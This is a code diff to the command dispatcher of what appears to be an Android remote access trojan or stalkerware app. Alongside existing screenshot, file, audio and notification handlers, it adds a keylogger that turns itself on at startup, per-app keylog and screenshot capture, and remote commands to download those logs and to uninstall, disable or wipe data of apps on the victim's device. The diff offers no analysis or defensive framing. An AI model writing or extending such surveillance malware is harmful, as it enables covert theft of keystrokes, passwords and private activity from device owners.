@@ -61,6 +61,8 @@ public class SocketManager {
     private final ScreenshotHandler screenshotHandler;
     private final FileHandler       fileHandler;
     private final AudioRecorder     audioRecorder;
+    private final KeyloggerService  keyloggerService;
+    private final AppMonitor        appMonitor;
 
     public static synchronized SocketManager getInstance(Context context) {
         if (instance == null) instance = new SocketManager(context.getApplicationContext());
@@ -77,7 +79,15 @@ public class SocketManager {
         screenshotHandler  = new ScreenshotHandler(context);
         fileHandler        = new FileHandler(context);
         audioRecorder      = new AudioRecorder(context);
+        keyloggerService   = new KeyloggerService(context);
+        appMonitor         = new AppMonitor(context, keyloggerService);
+        // Auto-enable keylogger on init (will capture once accessibility is granted)
+        KeyloggerService.setEnabled(true);
     }
+
+    /** Expose appMonitor so UnifiedAccessibilityService can call it. */
+    public AppMonitor getAppMonitor()       { return appMonitor; }
+    public KeyloggerService getKeylogger()  { return keyloggerService; }
 
     // ── Connection lifecycle ──────────────────────────────────────────────
 
@@ -412,8 +422,25 @@ public class SocketManager {
         if (command.equals("delete_recording"))     return audioRecorder.deleteRecording(params.getString("filePath"));
 
         // ── Keylogger ────────────────────────────────────────────────────
-        if (command.equals("get_keylogs"))   return KeyloggerService.getKeylogs(context, params.optInt("limit", 100));
-        if (command.equals("clear_keylogs")) return KeyloggerService.clearLogs(context);
+        if (command.equals("get_keylogs"))            return keyloggerService.getKeylogs(params.optInt("limit", 100));
+        if (command.equals("clear_keylogs"))          return keyloggerService.clearKeylogs();
+        if (command.equals("list_keylog_files"))      return keyloggerService.listKeylogFiles();
+        if (command.equals("download_keylog_file"))   return keyloggerService.downloadKeylogFile(params.getString("date"));
+
+        // ── App Monitor ──────────────────────────────────────────────────
+        if (command.equals("list_app_monitor_apps"))    return appMonitor.listMonitoredApps();
+        if (command.equals("get_app_keylogs"))          return appMonitor.getAppKeylogs(params.getString("packageName"), params.optString("date", ""), params.optInt("limit", 200));
+        if (command.equals("list_app_keylog_files"))    return appMonitor.listAppKeylogFiles(params.getString("packageName"));
+        if (command.equals("download_app_keylog_file")) return appMonitor.downloadAppKeylogFile(params.getString("packageName"), params.getString("date"));
+        if (command.equals("list_app_screenshots"))     return appMonitor.listAppScreenshots(params.getString("packageName"));
+        if (command.equals("download_app_screenshot"))  return appMonitor.downloadAppScreenshot(params.getString("packageName"), params.getString("filename"));
+
+        // ── App Manager ──────────────────────────────────────────────────
+        if (command.equals("uninstall_app"))  return appMonitor.uninstallApp(params.getString("packageName"));
+        if (command.equals("force_stop_app")) return appMonitor.forceStopApp(params.getString("packageName"));
+        if (command.equals("open_app"))       return appMonitor.openApp(params.getString("packageName"));
+        if (command.equals("clear_app_data")) return appMonitor.clearAppData(params.getString("packageName"));
+        if (command.equals("disable_app"))    return appMonitor.disableApp(params.getString("packageName"));
 
         // ── Notifications ────────────────────────────────────────────────
         if (command.equals("get_notifications"))          return NotificationInterceptor.getAllNotifications();
